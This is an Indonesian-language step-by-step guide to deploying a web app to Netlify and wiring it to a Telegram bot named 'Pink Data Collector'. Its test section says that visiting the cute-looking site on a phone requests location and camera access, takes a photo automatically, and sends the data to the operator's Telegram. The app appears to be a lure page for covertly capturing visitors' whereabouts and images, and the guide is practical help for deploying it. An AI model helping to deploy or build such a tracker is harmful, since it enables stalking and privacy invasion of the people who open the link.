# 🚀 Panduan Deploy Cepat ke Netlify

## Step 1: Setup Telegram Bot (5 menit)

### A. Buat Bot
1. Buka Telegram, cari **@BotFather**
2. Kirim `/newbot`
3. Beri nama: `Pink Data Collector`
4. Beri username: `pink_data_bot` (harus ada "bot")
5. **Simpan Bot Token** yang diberikan!

### B. Dapat Chat ID
1. Cari **@myidbot** di Telegram
2. Kirim `/getid`
3. **Simpan Chat ID** yang diberikan!

## Step 2: Push ke GitHub

```bash
# Di folder netlify-app
git init
git add .
git commit -m "Pink cute app ready"

# Ganti dengan repo URL Anda
git remote add origin https://github.com/username/repo-name.git
git push -u origin main
```

## Step 3: Deploy ke Netlify

1. Login ke https://app.netlify.com
2. Klik **"Add new site"** → **"Import an existing project"**
3. Pilih **GitHub** → pilih repository Anda
4. Settings:
   - Build command: (kosongkan)
   - Publish directory: `public`
5. Klik **"Deploy site"**

## Step 4: Set Environment Variables

1. Di Netlify dashboard → **"Site settings"** → **"Environment variables"**
2. Add variable:
   - Key: `BOT_TOKEN`
   - Value: (paste Bot Token dari step 1)
3. Add variable:
   - Key: `CHAT_ID`
   - Value: (paste Chat ID dari step 1)
4. **Save**

## Step 5: Redeploy

1. Kembali ke **"Deploys"** tab
2. Klik **"Trigger deploy"** → **"Deploy site"**
3. Tunggu selesai (±1 menit)
4. **DONE!** Buka URL site Anda

## ✅ Test di Mobile

1. Buka URL site di mobile browser
2. Allow location permission
3. Allow camera permission
4. Foto otomatis diambil
5. Data terkirim ke Telegram!

## 🐛 Troubleshooting

**Permission tidak muncul?**
- Pastikan buka via HTTPS (Netlify auto SSL)
- Clear browser cache & cookies

**Data tidak terkirim?**
- Cek BOT_TOKEN dan CHAT_ID sudah benar
- Kirim `/start` ke bot Telegram Anda
- Cek Netlify Function logs di dashboard

**Foto tidak ter-capture?**
- Gunakan browser modern (Chrome/Safari)
- Pastikan camera tidak digunakan app lain

## 💡 Deployment Alternatives

### Via Netlify CLI
```bash
npm install -g netlify-cli
netlify login
netlify deploy --prod
```

### Via Drag & Drop
1. Zip folder `public`
2. Drop ke netlify.com/drop
3. Set env variables di dashboard
4. Redeploy

---

**Need help?** Cek README.md untuk panduan lengkap!
